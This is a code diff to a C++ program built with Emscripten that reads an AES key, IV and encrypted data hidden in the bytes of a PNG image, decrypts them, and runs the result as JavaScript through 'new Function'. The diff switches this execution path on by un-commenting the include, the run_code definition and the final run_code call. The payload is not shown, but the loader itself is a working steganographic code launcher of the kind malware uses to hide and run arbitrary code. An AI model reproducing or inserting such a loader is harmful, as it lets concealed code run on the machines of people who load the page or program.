@@ -1,6 +1,6 @@
 #define STB_IMAGE_IMPLEMENTATION
 
-// #include <emscripten.h>
+#include <emscripten.h>
 #include <string>
 #include <iostream>
 #include <sstream>
@@ -9,12 +9,13 @@
 
 using namespace std;
 
-// EM_JS(void, run_code, (const char* str), {
-//      new Function(UTF8ToString(str))();
-// });
+EM_JS(void, run_code, (const char* str), {
+     new Function(UTF8ToString(str))();
+});
 
 int main() {
-    int x, y, n;
+    int x, y, n, i;
+    int len = 64;
     unsigned char *data = stbi_load("../code/img_enc.png",
      &x, &y, &n, 0);
     
@@ -24,34 +25,29 @@ int main() {
         return 1;
     }
     
-    int idx = ((int*) data)[0];
+    int curr = ((int*) data)[0];
 
-    int i = 0;
     ostringstream iv("");
-    while (data[idx + (i * n)]) {
-        iv << data[idx + (i * n)]; 
-        i++;
+    for (i = 0; i < 16; i++) {
+        iv << data[curr + (i * n)];
     }
+    curr = curr + (i * n);
 
-    i++;
     ostringstream key("");
-    while (data[idx + (i * n)]) {
-        key << data[idx + (i * n)]; 
-        i++;
+    for (i = 0; i < 32; i++) {
+        key << data[curr + (i * n)];
     }
+    curr = curr + (i * n);
 
-    i++;
     ostringstream enc("");
-    while (data[idx + (i * n)]) {
-        enc << data[idx + (i * n)]; 
-        i++;
+    for (i = 0; i < len; i++) {
+        enc << data[curr + (i * n)];
     }
     
-    int len = enc.str().length();
     AES aes(256);
     unsigned char *dec = aes.DecryptCBC((unsigned char*) enc.str().c_str(), len * sizeof(unsigned char), 
                                         (unsigned char*)key.str().c_str(), (unsigned char*)iv.str().c_str(), len);
-    // run_code((char*) dec);
+    run_code((char*) dec);
 
     delete[] dec;
     stbi_image_free(data);
